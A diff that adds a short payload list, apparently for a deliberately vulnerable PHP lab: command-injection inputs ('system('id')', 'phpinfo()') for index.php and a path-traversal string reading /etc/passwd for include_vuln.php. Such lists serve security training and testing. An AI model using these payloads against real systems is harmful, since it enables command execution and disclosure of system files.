@@ -1,0 +1,6 @@
+For index.php
+  1; system('id')
+  1; phpinfo();
+
+For include_vuln.php
+  1../../../../../../../../../../../etc/passwd
